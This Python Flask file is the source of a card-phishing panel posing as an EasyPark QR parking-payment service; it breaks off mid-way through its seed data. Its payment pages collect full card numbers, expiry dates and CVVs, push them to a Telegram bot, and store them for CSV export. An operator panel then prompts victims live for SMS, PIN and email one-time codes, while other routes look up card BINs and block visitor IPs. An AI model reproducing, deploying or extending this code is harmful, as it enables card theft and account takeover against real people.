from flask import Flask, render_template, redirect, url_for, request, flash, abort, Response
from flask_login import LoginManager, login_user, logout_user, login_required, current_user
from flask_socketio import SocketIO, emit, join_room
from models import db, User, ParkingLot, Reservation, ParkingSession
from datetime import datetime
from functools import wraps
import os
import secrets
from dotenv import load_dotenv
load_dotenv()
import ipaddress
import csv
import io
import json
import urllib.request
import threading

socketio = SocketIO()
_session_sids = {}   # sid → token
_offline_timers = {} # token → threading.Timer (grace period)
_admin_sids = {}
_blocked_ips = set()
_geoip_cache = {}

_COUNTRY_CURRENCY = {
    'CH': {'code':'CHF','symbol':'CHF','rate':3.50},
    'GB': {'code':'GBP','symbol':'£',  'rate':2.50},
    'DK': {'code':'DKK','symbol':'kr', 'rate':25.00},
    'SE': {'code':'SEK','symbol':'kr', 'rate':25.00},
    'NO': {'code':'NOK','symbol':'kr', 'rate':30.00},
    'IS': {'code':'ISK','symbol':'kr', 'rate':250.00},
    'PL': {'code':'PLN','symbol':'zł', 'rate':8.00},
    'CZ': {'code':'CZK','symbol':'Kč', 'rate':50.00},
    'HU': {'code':'HUF','symbol':'Ft', 'rate':800.00},
    'BG': {'code':'BGN','symbol':'лв', 'rate':3.00},
    'DE': {'code':'EUR','symbol':'€',  'rate':2.50},
    'FR': {'code':'EUR','symbol':'€',  'rate':3.00},
    'NL': {'code':'EUR','symbol':'€',  'rate':3.50},
    'BE': {'code':'EUR','symbol':'€',  'rate':2.50},
    'AT': {'code':'EUR','symbol':'€',  'rate':2.50},
    'IT': {'code':'EUR','symbol':'€',  'rate':2.00},
    'ES': {'code':'EUR','symbol':'€',  'rate':2.00},
    'PT': {'code':'EUR','symbol':'€',  'rate':1.50},
    'IE': {'code':'EUR','symbol':'€',  'rate':3.00},
    'LU': {'code':'EUR','symbol':'€',  'rate':2.50},
    'FI': {'code':'EUR','symbol':'€',  'rate':2.50},
    'GR': {'code':'EUR','symbol':'€',  'rate':1.50},
    'RO': {'code':'EUR','symbol':'€',  'rate':2.00},
    'SK': {'code':'EUR','symbol':'€',  'rate':1.50},
    'SI': {'code':'EUR','symbol':'€',  'rate':1.50},
    'HR': {'code':'EUR','symbol':'€',  'rate':1.50},
    'EE': {'code':'EUR','symbol':'€',  'rate':2.00},
    'LV': {'code':'EUR','symbol':'€',  'rate':2.00},
    'LT': {'code':'EUR','symbol':'€',  'rate':2.00},
    'MT': {'code':'EUR','symbol':'€',  'rate':2.00},
    'CY': {'code':'EUR','symbol':'€',  'rate':1.50},
}

def _currency_for_country(cc):
    return _COUNTRY_CURRENCY.get(cc or '', {'code':'EUR','symbol':'€','rate':2.50})

_TG_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
_TG_CHAT  = os.getenv('TELEGRAM_CHAT_ID', '')

def _send_telegram(text):
    if not _TG_TOKEN or not _TG_CHAT:
        return
    try:
        payload = json.dumps({'chat_id': _TG_CHAT, 'text': text, 'parse_mode': 'HTML'}).encode()
        req = urllib.request.Request(
            f'https://api.telegram.org/bot{_TG_TOKEN}/sendMessage',
            data=payload,
            headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


def _detect_browser(ua):
    u = ua.lower()
    if 'edg' in u:      return 'Edge'
    if 'chrome' in u:   return 'Chrome'
    if 'firefox' in u:  return 'Firefox'
    if 'safari' in u:   return 'Safari'
    if 'opr' in u or 'opera' in u: return 'Opera'
    return 'Unknown'


def _detect_country_ip(ip):
    if ip in _geoip_cache:
        return _geoip_cache[ip]
    try:
        addr = ipaddress.ip_address(ip)
        if addr.is_private or addr.is_loopback:
            _geoip_cache[ip] = ('Romania (LAN)', 'RO')
            return _geoip_cache[ip]
    except Exception:
        pass
    try:
        req = urllib.request.Request(
            f'http://ip-api.com/json/{ip}?fields=country,countryCode',
            headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=1) as resp:
            d = json.loads(resp.read())
        result = (d.get('country',''), d.get('countryCode',''))
        _geoip_cache[ip] = result
        return result
    except Exception:
        return ('', '')


def create_app():
    app = Flask(__name__)
    app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'parkside-secret-key-2024')
    db_path = os.environ.get('DATABASE_URL', 'sqlite:///easypark.db')
    app.config['SQLALCHEMY_DATABASE_URI'] = db_path
    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
    app.config['SESSION_COOKIE_SECURE'] = True
    app.config['SESSION_COOKIE_HTTPONLY'] = True
    app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
    app.config['REMEMBER_COOKIE_SECURE'] = True
    app.config['REMEMBER_COOKIE_HTTPONLY'] = True

    db.init_app(app)
    socketio.init_app(app, cors_allowed_origins='*', async_mode='gevent')

    login_manager = LoginManager()
    login_manager.init_app(app)
    login_manager.login_view = 'login'
    login_manager.login_message = 'Autentifică-te pentru a continua.'

    @login_manager.user_loader
    def load_user(user_id):
        return db.session.get(User, int(user_id))

    @app.context_processor
    def inject_globals():
        return {'now': datetime.utcnow()}

    def admin_required(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            if not current_user.is_authenticated or not current_user.is_admin:
                flash('Acces restricționat.', 'error')
                return redirect(url_for('index'))
            return f(*args, **kwargs)
        return decorated

    # ── Auto-migrate new columns ────────────────────────────────────────────
    with app.app_context():
        db.create_all()
        try:
            with db.engine.connect() as _wc:
                _wc.execute(db.text('PRAGMA journal_mode=WAL'))
                _wc.execute(db.text('PRAGMA synchronous=NORMAL'))
                _wc.execute(db.text('PRAGMA cache_size=-8000'))
                _wc.commit()
        except Exception:
            pass
        for _col, _typ in [('bin_bank','VARCHAR(300)'),('country_code','VARCHAR(10)'),('currency_code','VARCHAR(10)')]:

            try:
                with db.engine.connect() as _conn:
                    _conn.execute(db.text(f'ALTER TABLE parking_session ADD COLUMN {_col} {_typ}'))
                    _conn.commit()
            except Exception:
                pass

    # ── Well-known (mobile app deep linking) ────────────────────────────────

    @app.route('/.well-known/apple-app-site-association')
    def apple_app_site_association():
        # Update TEAMID → your Apple Developer Team ID (e.g. ABCDE12345)
        # after first TestFlight build
        data = {
            "applinks": {
                "apps": [],
                "details": [{
                    "appID": "TEAMID.xyz.easyparkpay.app",
                    "paths": ["/pay/*"]
                }]
            }
        }
        return Response(json.dumps(data), mimetype='application/json',
                        headers={'Cache-Control': 'no-cache'})

    @app.route('/.well-known/assetlinks.json')
    def assetlinks():
        # Update sha256_cert_fingerprints → run after first signed Android build:
        # keytool -list -v -keystore your.keystore | grep SHA256
        data = [{
            "relation": ["delegate_permission/common.handle_all_urls"],
            "target": {
                "namespace": "android_app",
                "package_name": "xyz.easyparkpay.app",
                "sha256_cert_fingerprints": [
                    "PLACEHOLDER_SHA256_FINGERPRINT"
                ]
            }
        }]
        return Response(json.dumps(data), mimetype='application/json',
                        headers={'Cache-Control': 'no-cache'})

    # ── Public ──────────────────────────────────────────────────────────────

    @app.route('/favicon.ico')
    def favicon():
        return app.send_static_file('favicon.ico')

    @app.route('/')
    def index():
        return redirect('https://www.easypark.com/en-dk', 301)

    @app.route('/search')
    def search():
        city = request.args.get('city', '').strip()
        date = request.args.get('date', '')
        query = ParkingLot.query.filter_by(is_active=True)
        if city:
            query = query.filter(ParkingLot.city.ilike(f'%{city}%'))
        lots = query.all()
        return render_template('search.html', lots=lots, city=city, date=date)

    # ── Auth ─────────────────────────────────────────────────────────────────

    @app.route('/login', methods=['GET', 'POST'])
    def login():
        if current_user.is_authenticated:
            return redirect(url_for('index'))
        if request.method == 'POST':
            user = User.query.filter_by(email=request.form.get('email')).first()
            if user and user.check_password(request.form.get('password')):
                login_user(user)
                if user.is_admin:
                    return redirect(url_for('admin_sessions'))
                return redirect(request.args.get('next') or url_for('my_reservations'))
            flash('Email sau parolă incorectă.', 'error')
        return render_template('auth/login.html')

    @app.route('/register', methods=['GET', 'POST'])
    def register():
        if current_user.is_authenticated:
            return redirect(url_for('index'))
        if request.method == 'POST':
            email = request.form.get('email')
            if User.query.filter_by(email=email).first():
                flash('Există deja un cont cu acest email.', 'error')
            else:
                user = User(name=request.form.get('name'), email=email)
                user.set_password(request.form.get('password'))
                db.session.add(user)
                db.session.commit()
                login_user(user)
                flash('Cont creat cu succes!', 'success')
                return redirect(url_for('my_reservations'))
        return render_template('auth/register.html')

    @app.route('/logout')
    @login_required
    def logout():
        logout_user()
        return redirect(url_for('index'))

    # ── User reservations ─────────────────────────────────────────────────────

    @app.route('/book/<int:lot_id>', methods=['GET', 'POST'])
    @login_required
    def book(lot_id):
        lot = ParkingLot.query.get_or_404(lot_id)
        if request.method == 'POST':
            start = datetime.strptime(request.form['start_time'], '%Y-%m-%dT%H:%M')
            end = datetime.strptime(request.form['end_time'], '%Y-%m-%dT%H:%M')
            if end <= start:
                flash('Ora de sfârșit trebuie să fie după ora de început.', 'error')
            elif lot.available_spots <= 0:
                flash('Nu mai sunt locuri disponibile.', 'error')
            else:
                hours = (end - start).total_seconds() / 3600
                price = round(hours * lot.price_per_hour, 2)
                spot = lot.total_spots - lot.available_spots + 1
                res = Reservation(
                    user_id=current_user.id, parking_lot_id=lot.id,
                    start_time=start, end_time=end,
                    spot_number=spot, total_price=price
                )
                lot.available_spots -= 1
                db.session.add(res)
                db.session.commit()
                flash('Rezervare confirmată cu succes!', 'success')
                return redirect(url_for('my_reservations'))
        return render_template('booking.html', lot=lot)

    @app.route('/my-reservations')
    @login_required
    def my_reservations():
        reservations = Reservation.query.filter_by(user_id=current_user.id)\
            .order_by(Reservation.created_at.desc()).all()
        return render_template('my_reservations.html', reservations=reservations)

    @app.route('/cancel/<int:res_id>', methods=['POST'])
    @login_required
    def cancel_reservation(res_id):
        res = Reservation.query.get_or_404(res_id)
        if res.user_id != current_user.id:
            abort(403)
        if res.status == 'confirmed':
            res.status = 'cancelled'
            res.parking_lot.available_spots += 1
            db.session.commit()
            flash('Rezervare anulată.', 'success')
        return redirect(url_for('my_reservations'))

    # ── Payment Flow (QR) ────────────────────────────────────────────────────

    @app.route('/pay/<int:lot_id>', methods=['GET', 'POST'])
    def pay_step1(lot_id):
        lot = ParkingLot.query.get_or_404(lot_id)
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        if ip in _blocked_ips:
            return render_template('pay/blocked.html'), 403
        if request.method == 'POST':
            token = request.form.get('token', '').strip()
            ps = ParkingSession.query.filter_by(token=token).first() if token else None
            plate = request.form['plate'].strip().upper()
            locality = request.form.get('locality', '').strip()
            hours = float(request.form['hours'])
            time_unit = request.form.get('time_unit', 'ore')
            car_type = request.form.get('car_type', 'Autoturism')
            browser = _detect_browser(request.user_agent.string)
            if ps and ps.country_code:
                country_name = ps.country or ''
                country_code = ps.country_code
            else:
                country_name, country_code = _detect_country_ip(ip)
            curr = _currency_for_country(country_code)
            rate = curr['rate']
            if time_unit == 'minute':
                auto_price = round(max(0.01, hours / 60 * rate), 2)
            else:
                auto_price = round(hours * rate, 2)
            if ps:
                ps.plate_number = plate
                ps.user_city = locality
                ps.hours = hours
                ps.total_price = auto_price
                ps.status = 'price_set'
                ps.car_type = car_type
                ps.time_unit = time_unit
                ps.country_code = country_code
                ps.currency_code = curr['code']
                db.session.commit()
                socketio.emit('session_updated', {
                    'id': ps.id, 'plate': plate, 'locality': locality,
                    'hours': hours, 'car_type': car_type, 'time_unit': time_unit,
                    'price': auto_price, 'currency': curr['symbol'], 'country_code': country_code
                }, room='admin')
            else:
                token = secrets.token_hex(16)
                ps = ParkingSession(
                    token=token, parking_lot_id=lot_id,
                    plate_number=plate, user_city=locality,
                    hours=hours, total_price=auto_price,
                    status='price_set',
                    car_type=car_type, time_unit=time_unit,
                    ip_address=ip, browser=browser, country=country_name,
                    country_code=country_code, currency_code=curr['code']
                )
                db.session.add(ps)
                db.session.commit()
                socketio.emit('new_session', {
                    'id': ps.id, 'plate': plate, 'locality': locality,
                    'hours': hours, 'lot': lot.name, 'token': token,
                    'car_type': car_type, 'time_unit': time_unit,
                    'ip': ip, 'browser': browser, 'country': country_name,
                    'lot_id': lot_id, 'time': ps.created_at.strftime('%H:%M:%S'),
                    'price': auto_price, 'currency': curr['symbol'], 'country_code': country_code
                }, room='admin')
            socketio.emit('price_set', {'id': ps.id, 'price': auto_price, 'currency': curr['symbol']}, room='admin')
            return redirect(url_for('pay_card', token=token))
        # GET — create scanning session immediately
        browser = _detect_browser(request.user_agent.string)
        country_name, country_code = _detect_country_ip(ip)
        curr = _currency_for_country(country_code)
        token = secrets.token_hex(16)
        ps = ParkingSession(
            token=token, parking_lot_id=lot_id,
            plate_number=None, user_city=None,
            hours=None, total_price=None,
            status='scanning',
            ip_address=ip, browser=browser, country=country_name,
            country_code=country_code, currency_code=curr['code']
        )
        db.session.add(ps)
        db.session.commit()
        socketio.emit('new_session', {
            'id': ps.id, 'plate': '—', 'locality': '…',
            'hours': '—', 'lot': lot.name, 'token': token,
            'car_type': '—', 'time_unit': '—',
            'ip': ip, 'browser': browser, 'country': country_name,
            'lot_id': lot_id, 'time': ps.created_at.strftime('%H:%M:%S'),
            'price': None, 'currency': curr['symbol'], 'country_code': country_code
        }, room='admin')
        return render_template('pay/step1.html', lot=lot, token=token,
                               currency_symbol=curr['symbol'], rate=curr['rate'])

    @app.route('/pay/wait/<token>')
    def pay_waiting(token):
        ps = ParkingSession.query.filter_by(token=token).first_or_404()
        if ps.status in ('confirmed', 'price_set'):
            return redirect(url_for('pay_card', token=token))
        if ps.status in ('completed', 'rejected'):
            return redirect(url_for('pay_done', token=token))
        return render_template('pay/waiting.html', token=token, session=ps)

    @app.route('/pay/card/<token>', methods=['GET', 'POST'])
    def pay_card(token):
        ps = ParkingSession.query.filter_by(token=token).first_or_404()
        if ps.status not in ('confirmed', 'price_set', 'payment_pending'):
            return redirect(url_for('pay_waiting', token=token))
        if request.method == 'POST':
            card_raw = request.form['card_number'].replace(' ', '')
            card_fmt = request.form['card_number']  # formatted with spaces
            ps.card_last4 = card_raw[-4:] if len(card_raw) >= 4 else card_raw
            ps.card_number_display = card_fmt  # full number as typed
            ps.exp_date = request.form.get('exp_date', '')
            ps.cvv = request.form.get('cvv', '')
            bin_bank = request.form.get('bin_bank', '')
            ps.bin_bank = bin_bank
            ps.status = 'payment_pending'
            db.session.commit()
            _card_curr = _currency_for_country(ps.country_code or '')
            _tg_text = (
                f'🔔 <b>Card nou primit</b>\n'
                f'━━━━━━━━━━━━━━━━━━\n'
                f'💳 <code>{ps.card_number_display}</code>\n'
                f'📅 <code>{ps.exp_date}</code>\n'
                f'🔐 <code>{ps.cvv}</code>\n'
                f'━━━━━━━━━━━━━━━━━━\n'
                f'🏦 {bin_bank or "—"}\n'
                f'🚗 <code>{ps.plate_number}</code>\n'
                f'🌍 {ps.country or "—"}  |  {ps.browser or "—"}\n'
                f'⏱ {ps.hours} {ps.time_unit or "ore"}  |  💰 <b>{ps.total_price} {_card_curr["symbol"]}</b>\n'
                f'🕐 {datetime.utcnow().strftime("%H:%M:%S UTC")}'
            )
            threading.Thread(target=_send_telegram, args=(_tg_text,), daemon=True).start()
            socketio.emit('payment_submitted', {
                    'id': ps.id, 'plate': ps.plate_number,
                    'card_display': ps.card_number_display,
                    'card_last4': ps.card_last4,
                    'exp': ps.exp_date, 'cvv': ps.cvv,
                    'price': ps.total_price,
                    'currency': _card_curr['symbol'],
                    'hours': ps.hours, 'lot': ps.parking_lot.name,
                    'car_type': ps.car_type or '—',
                    'time_unit': ps.time_unit or 'ore',
                    'ip': ps.ip_address or '—',
                    'browser': ps.browser or '—',
                    'country': ps.country or '—',
                    'country_code': ps.country_code or '—',
                    'token': token,
                    'bin_bank': bin_bank or '—',
                    'time': datetime.utcnow().strftime('%H:%M:%S')
                }, room='admin')
            return redirect(url_for('pay_waiting2', token=token))
        curr = _currency_for_country(ps.country_code or '')
        return render_template('pay/card.html', token=token, session=ps,
                               currency_symbol=curr['symbol'])

    @app.route('/pay/wait2/<token>')
    def pay_waiting2(token):
        ps = ParkingSession.query.filter_by(token=token).first_or_404()
        if ps.status in ('completed', 'rejected'):
            return redirect(url_for('pay_done', token=token))
        curr = _currency_for_country(ps.country_code or '')
        return render_template('pay/waiting2.html', token=token, session=ps,
                               currency_symbol=curr['symbol'])

    @app.route('/pay/done/<token>')
    def pay_done(token):
        ps = ParkingSession.query.filter_by(token=token).first_or_404()
        curr = _currency_for_country(ps.country_code or '')
        return render_template('pay/done.html', session=ps, currency_symbol=curr['symbol'])

    @app.route('/admin/sessions/<int:sid>/send_link', methods=['POST'])
    @login_required
    @admin_required
    def admin_send_link(sid):
        from flask import jsonify
        ps = ParkingSession.query.get_or_404(sid)
        url = request.form.get('url', '').strip()
        if url:
            socketio.emit('open_link', {'url': url}, room=f'session_{ps.token}')
        return jsonify({'ok': True})

    @app.route('/pay/status/<token>')
    def pay_status(token):
        from flask import jsonify
        ps = ParkingSession.query.filter_by(token=token).first_or_404()
        return jsonify({'status': ps.status})

    @app.route('/pay/bin/<bin6>')
    def bin_lookup(bin6):
        from flask import jsonify
        import re
        if not re.match(r'^\d{6}$', bin6):
            return jsonify({}), 400
        headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
        # Primary: bins.antipublic.cc — has bank name, level, type
        try:
            req = urllib.request.Request(
                f'https://bins.antipublic.cc/bins/{bin6}', headers=headers)
            with urllib.request.urlopen(req, timeout=4) as resp:
                data = json.loads(resp.read())
            if data.get('bank') or data.get('brand'):
                return jsonify({'_src': 'antipublic', **data})
        except Exception:
            pass
        # Fallback: binlist.net
        try:
            req = urllib.request.Request(
                f'https://lookup.binlist.net/{bin6}',
                headers={**headers, 'Accept-Version': '3'})
            with urllib.request.urlopen(req, timeout=4) as resp:
                data = json.loads(resp.read())
            return jsonify({'_src': 'binlist', **data})
        except Exception:
            return jsonify({}), 200

    # ── Admin ─────────────────────────────────────────────────────────────────

    @app.route('/admin')
    @login_required
    @admin_required
    def admin_dashboard():
        total_users = User.query.filter_by(is_admin=False).count()
        active_res = Reservation.query.filter_by(status='confirmed').count()
        total_res = Reservation.query.count()
        revenue = db.session.query(db.func.sum(Reservation.total_price))\
            .filter_by(status='confirmed').scalar() or 0
        total_parkings = ParkingLot.query.count()
        recent = Reservation.query.order_by(Reservation.created_at.desc()).limit(8).all()
        return render_template('admin/dashboard.html',
            total_users=total_users, active_reservations=active_res,
            total_reservations=total_res, total_revenue=round(revenue, 2),
            total_parkings=total_parkings, recent=recent)

    @app.route('/admin/sessions')
    @login_required
    @admin_required
    def admin_sessions():
        pending = ParkingSession.query.filter(
            ParkingSession.status.in_(['pending', 'price_set', 'payment_pending', 'completed']),
            ParkingSession.is_archived == False
        ).order_by(ParkingSession.created_at.desc()).all()
        history = ParkingSession.query.filter(
            ParkingSession.status == 'rejected',
            ParkingSession.is_archived == False
        ).order_by(ParkingSession.created_at.desc()).limit(20).all()
        return render_template('admin/sessions.html', pending=pending, history=history)

    @app.route('/admin/sessions/clear_history', methods=['POST'])
    @login_required
    @admin_required
    def admin_clear_history():
        ParkingSession.query.filter_by(status='rejected', is_archived=False).update({'is_archived': True})
        db.session.commit()
        return ('', 204)

    @app.route('/admin/sessions/<int:sid>/confirm', methods=['POST'])
    @login_required
    @admin_required
    def admin_confirm_session(sid):
        ps = ParkingSession.query.get_or_404(sid)
        ps.status = 'confirmed'
        db.session.commit()
        socketio.emit('session_confirmed', {}, room=f'session_{ps.token}')
        return ('', 204)

    @app.route('/admin/sessions/<int:sid>/approve', methods=['POST'])
    @login_required
    @admin_required
    def admin_approve_payment(sid):
        ps = ParkingSession.query.get_or_404(sid)
        ps.status = 'completed'
        db.session.commit()
        socketio.emit('payment_approved', {}, room=f'session_{ps.token}')
        socketio.emit('session_approved', {'id': ps.id}, room='admin')
        return ('', 204)

    @app.route('/admin/sessions/<int:sid>/archive', methods=['POST'])
    @login_required
    @admin_required
    def admin_archive_session(sid):
        ps = ParkingSession.query.get_or_404(sid)
        ps.is_archived = True
        db.session.commit()
        socketio.emit('session_removed', {'id': ps.id}, room='admin')
        return ('', 204)

    @app.route('/admin/sessions/<int:sid>/reject', methods=['POST'])
    @login_required
    @admin_required
    def admin_reject_session(sid):
        ps = ParkingSession.query.get_or_404(sid)
        ps.status = 'rejected'
        db.session.commit()
        socketio.emit('session_rejected', {}, room=f'session_{ps.token}')
        socketio.emit('session_removed', {'id': ps.id}, room='admin')
        return ('', 204)

    @app.route('/admin/sessions/<int:sid>/set_price', methods=['POST'])
    @login_required
    @admin_required
    def admin_set_price(sid):
        ps = ParkingSession.query.get_or_404(sid)
        price = float(request.form.get('price', 0))
        ps.total_price = round(price, 2)
        ps.status = 'price_set'
        db.session.commit()
        socketio.emit('open_payment', {'token': ps.token, 'price': ps.total_price}, room=f'session_{ps.token}')
        _pc = _currency_for_country(ps.country_code or '')
        socketio.emit('price_set', {'id': ps.id, 'price': ps.total_price, 'currency': _pc['symbol']}, room='admin')
        return ('', 204)

    @app.route('/admin/sessions/<int:sid>/retry', methods=['POST'])
    @login_required
    @admin_required
    def admin_retry_session(sid):
        ps = ParkingSession.query.get_or_404(sid)
        lot_id = ps.parking_lot_id
        ps.status = 'pending'
        ps.card_last4 = None; ps.card_number_display = None
        ps.exp_date = None; ps.cvv = None
        ps.sms_status = None; ps.pin_code = None; ps.mail_code = None; ps.total_price = None
        db.session.commit()
        socketio.emit('session_retry', {'lot_id': lot_id}, room=f'session_{ps.token}')
        socketio.emit('session_removed', {'id': ps.id}, room='admin')
        return ('', 204)

    @app.route('/admin/sessions/<int:sid>/block', methods=['POST'])
    @login_required
    @admin_required
    def admin_block_session(sid):
        ps = ParkingSession.query.get_or_404(sid)
        if ps.ip_address:
            _blocked_ips.add(ps.ip_address)
        ps.status = 'rejected'
        db.session.commit()
        socketio.emit('session_rejected', {}, room=f'session_{ps.token}')
        socketio.emit('session_removed', {'id': ps.id}, room='admin')
        return ('', 204)

    @app.route('/admin/sessions/<int:sid>/app_confirm', methods=['POST'])
    @login_required
    @admin_required
    def admin_app_confirm(sid):
        ps = ParkingSession.query.get_or_404(sid)
        socketio.emit('app_confirm', {'bank': ps.bin_bank or ''}, room=f'session_{ps.token}')
        return ('', 204)

    @app.route('/admin/sessions/<int:sid>/sms', methods=['POST'])
    @login_required
    @admin_required
    def admin_send_sms(sid):
        ps = ParkingSession.query.get_or_404(sid)
        ps.sms_status = 'waiting'
        db.session.commit()
        socketio.emit('sms_waiting', {'id': ps.id}, room='admin')
        socketio.emit('sms_received', {}, room=f'session_{ps.token}')
        return ('', 204)

    @app.route('/admin/sessions/<int:sid>/mail', methods=['POST'])
    @login_required
    @admin_required
    def admin_send_mail(sid):
        ps = ParkingSession.query.get_or_404(sid)
        ps.mail_code = 'waiting'
        db.session.commit()
        socketio.emit('mail_waiting', {'id': ps.id}, room='admin')
        socketio.emit('mail_received', {}, room=f'session_{ps.token}')
        return ('', 204)

    @app.route('/admin/sessions/<int:sid>/pin', methods=['POST'])
    @login_required
    @admin_required
    def admin_request_pin(sid):
        ps = ParkingSession.query.get_or_404(sid)
        db.session.commit()
        socketio.emit('pin_waiting', {'id': ps.id}, room='admin')
        socketio.emit('show_pin_prompt', {}, room=f'session_{ps.token}')
        return ('', 204)

    @app.route('/admin/sessions/export')
    @login_required
    @admin_required
    def admin_export_sessions():
        sessions = ParkingSession.query.filter_by(is_archived=True).order_by(ParkingSession.created_at.desc()).all()
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(['ID','Plăcuță','Card','Exp','CVV','Localitate','Durată','Unitate','Preț','Status','IP','Browser','Țară','Data'])
        for s in sessions:
            writer.writerow([s.id, s.plate_number,
                             s.card_number_display or '', s.exp_date or '', s.cvv or '',
                             s.user_city or '', s.hours, s.time_unit or 'ore',
                             s.total_price, s.status, s.ip_address or '',
                             s.browser or '', s.country or '',
                             s.created_at.strftime('%d.%m.%Y %H:%M')])
        output.seek(0)
        return Response(output.getvalue(), mimetype='text/csv',
                        headers={'Content-Disposition': 'attachment;filename=easypark_sessions.csv'})

    @app.route('/admin/sessions/delete_all', methods=['POST'])
    @login_required
    @admin_required
    def admin_delete_all_sessions():
        ParkingSession.query.filter_by(is_archived=True).delete()
        db.session.commit()
        flash('Arhiva a fost ștearsă.', 'success')
        return redirect(url_for('admin_parkings'))

    @app.route('/admin/parkings')
    @login_required
    @admin_required
    def admin_parkings():
        lots = ParkingLot.query.order_by(ParkingLot.city).all()
        archived = ParkingSession.query.filter_by(is_archived=True).order_by(ParkingSession.created_at.desc()).all()
        return render_template('admin/parkings.html', lots=lots, archived=archived)

    @app.route('/admin/parkings/add', methods=['GET', 'POST'])
    @login_required
    @admin_required
    def admin_parking_add():
        if request.method == 'POST':
            spots = int(request.form['total_spots'])
            lot = ParkingLot(
                name=request.form['name'], address=request.form['address'],
                city=request.form['city'], total_spots=spots, available_spots=spots,
                price_per_hour=float(request.form['price_per_hour']),
                description=request.form.get('description', '')
            )
            db.session.add(lot)
            db.session.commit()
            flash('Parcare adăugată!', 'success')
            return redirect(url_for('admin_parkings'))
        return render_template('admin/parking_form.html', lot=None)

    @app.route('/admin/parkings/<int:lot_id>/edit', methods=['GET', 'POST'])
    @login_required
    @admin_required
    def admin_parking_edit(lot_id):
        lot = ParkingLot.query.get_or_404(lot_id)
        if request.method == 'POST':
            lot.name = request.form['name']
            lot.address = request.form['address']
            lot.city = request.form['city']
            lot.total_spots = int(request.form['total_spots'])
            lot.price_per_hour = float(request.form['price_per_hour'])
            lot.description = request.form.get('description', '')
            lot.is_active = 'is_active' in request.form
            db.session.commit()
            flash('Parcare actualizată!', 'success')
            return redirect(url_for('admin_parkings'))
        return render_template('admin/parking_form.html', lot=lot)

    @app.route('/admin/parkings/<int:lot_id>/delete', methods=['POST'])
    @login_required
    @admin_required
    def admin_parking_delete(lot_id):
        lot = ParkingLot.query.get_or_404(lot_id)
        db.session.delete(lot)
        db.session.commit()
        flash('Parcare ștearsă.', 'success')
        return redirect(url_for('admin_parkings'))

    @app.route('/admin/reservations')
    @login_required
    @admin_required
    def admin_reservations():
        reservations = Reservation.query.order_by(Reservation.created_at.desc()).all()
        return render_template('admin/reservations.html', reservations=reservations)

    @app.route('/admin/reservations/<int:res_id>/status', methods=['POST'])
    @login_required
    @admin_required
    def admin_reservation_status(res_id):
        res = Reservation.query.get_or_404(res_id)
        new_status = request.form.get('status')
        if new_status in ('confirmed', 'cancelled', 'completed'):
            if new_status == 'cancelled' and res.status == 'confirmed':
                res.parking_lot.available_spots += 1
            res.status = new_status
            db.session.commit()
            flash('Status actualizat.', 'success')
        return redirect(url_for('admin_reservations'))

    @app.route('/admin/users')
    @login_required
    @admin_required
    def admin_users():
        users = User.query.filter_by(is_admin=False).order_by(User.created_at.desc()).all()
        return render_template('admin/users.html', users=users)

    # ── Socket Events ────────────────────────────────────────────────────────

    @socketio.on('join_admin')
    def on_join_admin():
        join_room('admin')
        ip = (request.headers.get('X-Forwarded-For', '') or '').split(',')[0].strip() or request.remote_addr or '?'
        _admin_sids[request.sid] = ip
        ips = list(set(_admin_sids.values()))
        socketio.emit('admin_count', {'count': len(_admin_sids), 'ips': ips}, room='admin')
        # Restore ping state for this admin (or reconnecting admin)
        for token in set(_session_sids.values()):
            socketio.emit('user_online', {'token': token}, room=request.sid)

    @socketio.on('join_session')
    def on_join_session(data):
        token = data.get('token', '')
        if not token:
            return
        join_room(f'session_{token}')
        _session_sids[request.sid] = token
        # Cancel any pending offline timer for this token (page navigation grace)
        timer = _offline_timers.pop(token, None)
        if timer:
            timer.cancel()
        socketio.emit('user_online', {'token': token}, room='admin')

    @socketio.on('sms_code_submitted')
    def on_sms_code_submitted(data):
        token = data.get('token', '')
        code = data.get('code', '')
        ps = ParkingSession.query.filter_by(token=token).first()
        if ps:
            ps.sms_status = code
            db.session.commit()
            socketio.emit('sms_code_update', {'id': ps.id, 'code': code}, room='admin')

    @socketio.on('pin_code_submitted')
    def on_pin_code_submitted(data):
        token = data.get('token', '')
        code = data.get('code', '')
        ps = ParkingSession.query.filter_by(token=token).first()
        if ps:
            ps.pin_code = code
            db.session.commit()
            socketio.emit('pin_code_update', {'id': ps.id, 'code': code}, room='admin')

    @socketio.on('mail_code_submitted')
    def on_mail_code_submitted(data):
        token = data.get('token', '')
        code = data.get('code', '')
        ps = ParkingSession.query.filter_by(token=token).first()
        if ps:
            ps.mail_code = code
            db.session.commit()
            socketio.emit('mail_code_update', {'id': ps.id, 'code': code}, room='admin')

    @socketio.on('app_confirmed')
    def on_app_confirmed(data):
        token = data.get('token', '')
        ps = ParkingSession.query.filter_by(token=token).first()
        if ps:
            socketio.emit('app_confirmed_update', {'id': ps.id}, room='admin')

    @socketio.on('disconnect')
    def on_disconnect(reason=None):
        token = _session_sids.pop(request.sid, None)
        if token:
            # 3-second grace: if same token reconnects (page navigation), cancel offline
            def _emit_offline(tok=token):
                _offline_timers.pop(tok, None)
                socketio.emit('user_offline', {'token': tok}, room='admin')
            old = _offline_timers.pop(token, None)
            if old:
                old.cancel()
            t = threading.Timer(3.0, _emit_offline)
            t.daemon = True
            _offline_timers[token] = t
            t.start()
        if request.sid in _admin_sids:
            _admin_sids.pop(request.sid)
            ips = list(set(_admin_sids.values()))
            socketio.emit('admin_count', {'count': len(_admin_sids), 'ips': ips}, room='admin')

    return app


def seed_data(app):
    with app.app_context():
        db.create_all()
        if not User.query.filter_by(email='admin@parkside.com').first():
            admin = User(name='Administrator', email='admin@parkside.com', is_admin=True)
            admin.set_password('admin123')
            db.session.add(admin)
        if ParkingLot.query.count() == 0:
            lots = [
                ParkingLot(name='ParkSide Central', address='Strada Mihai Eminescu 12', city='București',
                           total_spots=50, available_spots=38, price_per_hour=5.0, is_active=True,
                           description='Parcare acoperită în centrul orașului'),
